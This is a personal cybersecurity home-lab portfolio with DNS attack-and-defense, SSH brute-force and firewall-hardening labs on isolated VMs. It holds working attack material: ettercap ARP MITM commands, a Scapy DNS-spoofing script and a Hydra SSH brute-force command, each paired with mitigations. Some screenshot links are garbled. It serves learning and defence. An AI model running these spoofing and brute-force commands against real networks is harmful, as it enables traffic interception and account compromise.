# Multi-Mac Cybersecurity Lab Portfolio

## 1. Lab Environment Overview

This document details a personal lab environment built on three Apple devices (MacBook, iMac, Mac Mini), each running multiple isolated virtual machines for cybersecurity and networking experiments.

### Hardware Overview
- **MacBook:** Used as the primary portable workstation for lab control and analysis tasks.
- **iMac:** Dedicated to running high-availability VMs for network infrastructure simulations.
- **Mac Mini:** Focused on low-power, always-on VM tasks and remote access testing.

### Virtualization Software
Each device utilizes virtualization software (VMware Fusion, Parallels Desktop, VirtualBox, etc.) to host and isolate lab experiments. All major VMs run Linux distributions suitable for cybersecurity exercises.

## 2. Network Topology

**Typical setup for experiments:**

| Device    | Purpose            | Example VMs                |
|-----------|--------------------|----------------------------|
| MacBook   | Attacker/Analyst   | Kali Linux, REMnux         |
| iMac      | Infrastructure     | Ubuntu Server, OpenBSD DNS |
| Mac Mini  | Victim/Testbed     | Windows 10, Metasploitable |

All VMs are connected using a virtualized NAT network, and can be configured into separate subnets per experiment.

## 3. Example Lab: DNS Security Exploration (Template)

**Objective:**  
Investigate DNS protocols and common attack vectors in a controlled, virtualized environment.

**Steps:**
- Deploy VMs on separate Macs (e.g., attacker VM on MacBook, DNS server on iMac, victim machine on Mac Mini).
- Set up DNS services, modify configurations, and monitor traffic.
- Run security tools to simulate and detect attacks (e.g., DNS spoofing, cache poisoning).

**Documentation to include:**
- Screenshots of VM setup and network configs
- Terminal output of commands run
- Wireshark packet captures (if used)
- Explanations of what was tested, results, and any mitigation strategies

## 4. Lab Submission and Reporting

For each experiment, maintain:
- Description of purpose/objective
- Step-by-step setup instructions (hardware and VM)
- Key configuration files/settings (redacted as needed)
- Analysis of results and lessons learned

**Template Table: (for each lab)**

| Experiment      | VM Setup      | Tasks Performed    | Outcome/Screenshot | Notes/Challenges        |
|-----------------|--------------|--------------------|--------------------|------------------------|
| DNS Exploration | 3 VMs, 3 Macs| Spoofing, Poisoning| [Screenshot Link]  | DNSSEC effect noticed  |
| SSH Hardening   | 2 VMs, 2 Macs| Key setup, brute   | [Log Output]       | Lockout after 5 tries  |
Example Lab: DNS Attack & Defense
Inside each VM:

Kali (Attacker)
Tools Installed:

nslookup, dig, ettercap, nmap

Install commands:

bash
sudo apt update
sudo apt install nslookup dnsutils ettercap-text-only nmap
Purpose: Provides tools for DNS querying, network mapping, and MITM attacks.

Ubuntu (DNS Server)
Tools Installed:

bind9 (DNS server software)

Install and configure:

bash
sudo apt update
sudo apt install bind9
sudo nano /etc/bind/named.conf.local
Add a new zone:

text
zone "demo.local" {
  type master;
  file "/etc/bind/db.demo.local";
};
Copy and edit a zone file:

bash
sudo cp /etc/bind/db.local /etc/bind/db.demo.local
sudo nano /etc/bind/db.demo.local
Change localhost references to your desired hostnames/IPs for lab.

Purpose: BIND9 runs as the authoritative server for your test domain.

Windows (Victim)
Hosts File Testing:

Edit hosts file:

Windows: C:\Windows\System32\drivers\etc\hosts

Add: 10.0.2.10 demo.local

Flush DNS cache:

text
ipconfig /flushdns
Purpose: Simulate DNS responses and how they're intercepted/spoofed.

Lab Network Communications
Assign static IPs on each VM (sample for Ubuntu):

bash
sudo nano /etc/netplan/01-netcfg.yaml
Example config:

text
network:
  version: 2
  ethernets:
    eth0:
      dhcp4: no
      addresses: [10.0.2.10/24]
      gateway4: 10.0.2.1
      nameservers:
        addresses: [10.0.2.10]
Apply config: sudo netplan apply

Test connectivity from each VM:

bash
ping 10.0.2.10          # Ping DNS server from attacker/victim
nslookup demo.local 10.0.2.10
DNS Attack Steps
Start Ettercap on attacker (Kali):

bash
sudo ettercap -T -M arp:remote /10.0.2.10/ /10.0.2.20/
Purpose: MITM between DNS server and victim.

Run a custom Python DNS spoof (on attacker):

python
# dns_spoof.py
from scapy.all import *
def dns_spoof(pkt):
    if pkt.haslayer(DNSQR):
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                      UDP(dport=pkt[UDP].sport, sport=53)/\
                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNS].qd.qname, rdata='1.2.3.4'))
        send(spoofed_pkt)
sniff(filter='udp port 53', prn=dns_spoof)
Purpose: Redirects DNS queries to a malicious IP.

Run with: sudo python3 dns_spoof.py

Observe on victim VM:

Attempt to visit demo.local in browser.

Screenshot the result (expected: redirected page or block message).

Mitigation

Enable DNSSEC in BIND9 (add to named.conf.options):

text
dnssec-enable yes;
dnssec-validation auto;
Restart BIND9:

bash
sudo systemctl restart bind9
Purpose: Enforces secure DNS lookups and blocks spoofed responses.

Reflection Table
Phase	Commands/Config Used	Purpose/Output	Screenshot Placeholder	Issue Found/Fixed
Setup	apt install, netplan config	VM tools ready	![VM Screens](	
DNS Server	named.conf, zone file	Valid domain setup	![BIND Config](	
Attack	ettercap, dns_spoof.py	MITM/successful spoof	![Attack Output]( Resolved permission error with sudo	
Observed	Browser/cmd on Windows	Spoof visible	![Victim Output]( Hosts file conflict	
Remediation	enable DNSSEC, restart BIND9	Spoof blocked	![DNSSEC Proof]( After config, spoofing failed	
Add Screenshots
`![Kali Linux Desktop](./ss-kali.pngd.pngvictimiagraml bash, Python scripts, and config file samples shown above with explanations.

7. Lessons Learned and Troubleshooting
Network isolation: Sometimes VMs are not on the same subnet; fixed by resetting virtual switch/NAT settings.

Permission errors: Use sudo for privileged actions.

BIND errors: Double-check zone file formats and named.conf includes.

8. Next Labs
SSH brute-force automation

Linux firewall with ufw and iptables

Web application attacks using DVWA

9. Example Lab: SSH Brute-Force and Server Hardening
Purpose
Simulate a brute-force attack against an SSH server and practice best practices for securing remote access.

Lab Setup
VMs and Roles
Attacker: Kali Linux (on MacBook)

Target: Ubuntu Server (on iMac)

Monitor/Log Analysis: Windows or another Linux VM (optional)

Network
Both VMs on the same NAT or Host-Only network.

Step-by-Step Instructions
1. Prepare the Target (Ubuntu Server)
Install OpenSSH:

bash
sudo apt update
sudo apt install openssh-server
Set a weak username/password for demo:

bash
sudo useradd labtest
sudo passwd labtest  # set to: Password123
Check SSH status:

bash
sudo systemctl status ssh
Screenshot:
`Ubuntu SSH running

Install Hydra:

bash
sudo apt update
sudo apt install hydra
Prepare a password file (passwords.txt) containing demo passwords.

Run Hydra against target:

bash
hydra -l labtest -P passwords.txt ssh://10.0.2.15
Purpose: Attempts to brute-force SSH.

Screenshot:
``

3. Observe and Analyze
Monitor login attempts on target:

bash
sudo tail -f /var/log/auth.log
Screenshot:
``

4. Harden SSH Configuration
Disable password auth, require SSH keys:

Edit /etc/ssh/sshd_config

text
PasswordAuthentication no
PermitRootLogin no
AllowUsers youruser
Restart SSH:

bash
sudo systemctl restart ssh
Try brute force again (should fail).

Screenshot:
``

Reflection Table
Phase	Command/Config	Purpose/Output	Screenshot Placeholder	Issue Found/Fix
SSH Setup	install, useradd	Weak login for brute	![Ubuntu SSH](	
Brute-Force	hydra	Find password	![Hydra](	Password exposed
Monitoring	tail /var/log/auth.log	Track attempts	![Log](	Spammed logs
Hardening	sshd_config changes	Only key auth allowed	![Hardened]( now fails	
Paste this new section below your last lab, follow it with screenshots as before, and update/fill with your actual attack/hardening results!


Lab: Linux Firewall (UFW/IPTables) and Host Hardening
Purpose
Secure a Linux VM by configuring its firewall and applying basic hardening techniques.

Lab Setup
VMs and Roles
Target: Ubuntu Server (iMac or any Mac VM)

Test Source: Kali or Windows VM (MacBook/Mac Mini)

Network
Both VMs are on the same virtual network segment.

Step-by-Step Instructions
1. Firewall Installation and Basic Rules
Enable UFW (Uncomplicated Firewall):

bash
sudo apt update
sudo apt install ufw
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow ssh
sudo ufw enable
sudo ufw status verbose
Screenshot:
``

2. Test Firewall from Kali
Scan from Kali:

bash
nmap -sS 10.0.2.15
Purpose: See what ports/services are visible.

Screenshot:
``

Try accessing blocked ports (should fail).

3. Advanced Firewall Rules
Allow only internal subnets:

bash
sudo ufw allow from 10.0.2.0/24 to any port 22
Restrict HTTP to specific IP:

bash
sudo ufw allow from 10.0.2.5 to any port 80
Screenshot:
`![Advanced UFW Rule](./ss-ufw-adv.pngDisable unused services:**

bash
sudo systemctl stop apache2
sudo systemctl disable apache2
Install Fail2ban:

bash
sudo apt install fail2ban
sudo systemctl enable --now fail2ban
Screenshot:
`![Fail2ban Active](./ss-fail2ban.pngView UFW logs:**

bash
sudo tail -f /var/log/ufw.log
Check Fail2ban secure log:

bash
sudo tail -f /var/log/fail2ban.log
Screenshot:
``

Reflection Table
Phase	Commands/Config	Purpose/Output	Screenshot Placeholder	Issue Found/Fix
UFW Setup	install, enable	Default deny/allow	![UFW](	
External Scan	nmap	Only SSH shown	![Nmap](	Hidden services
Advanced Rules	UFW rules	Limit IPs/ports	![AdvUFW]( Typo in subnet fixed	
Fail2ban	install, config	Auto blocks attacks	![F2B](	Needed to tune filters
Log Monitoring	tail	Monitor block/ban	![Logs](	
Continue to build your portfolio with detailed labs on IDS, web security (DVWA, OWASP), malware analysis, etc. If you want specific instructions for any of these next, just ask!

github.com favicon
Editing cyber-labs-portfolio/docs/Multi-Mac_Cybersecurity_Labs.md at main · yveszamor21/cyber-labs-portfolio
